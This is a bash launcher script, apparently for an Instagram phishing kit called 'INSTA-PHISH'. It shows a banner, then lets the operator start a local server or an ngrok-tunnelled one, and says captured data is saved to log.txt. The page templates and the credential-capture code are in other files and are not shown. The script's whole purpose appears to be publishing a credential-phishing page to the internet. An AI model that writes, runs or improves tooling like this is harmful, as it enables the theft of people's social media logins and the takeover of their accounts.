#!/bin/bash

function program_berhenti {
    echo "data saved in log.txt"
}
trap program_berhenti SIGINT SIGTERM


echo "wait a moment...";
sleep 3
clear
bash template/cek.sh
echo -e "\033[31m██ ███    ██ ███████ ████████  █████        ██████  ██   ██ ██ ███████ ██   ██\033[0m"
sleep 2
echo -e "\033[31m██ ████   ██ ██         ██    ██   ██       ██   ██ ██   ██ ██ ██      ██   ██\033[0m"
sleep 2
echo -e "\033[31m██ ██ ██  ██ ███████    ██    ███████ █████ ██████  ███████ ██ ███████ ███████\033[0m"
sleep 2
echo -e "\033[97m██ ██  ██ ██      ██    ██    ██   ██       ██      ██   ██ ██      ██ ██   ██\033[0m"
sleep 2
echo -e "\033[97m██ ██   ████ ███████    ██    ██   ██       ██      ██   ██ ██ ███████ ██   ██\033[0m"
echo "==============================================================================="
echo "option: [0-1]"
echo "[0] run the server"
echo "[1] run the ngrok server"
echo -n "[+]> "
read option;
clear
echo "starting server..."
sleep 3
clear
if [ "$option" -eq 0 ];then
   npm run main
else
   bash template/server.sh
#    xterm -e php -S localhost:$port & gnome-terminal -- bash -c 'ngrok http 80;exec bash'
#    gnome-terminal -- bash -c 'ngrok http 80;exec bash'
fi
program_berhenti


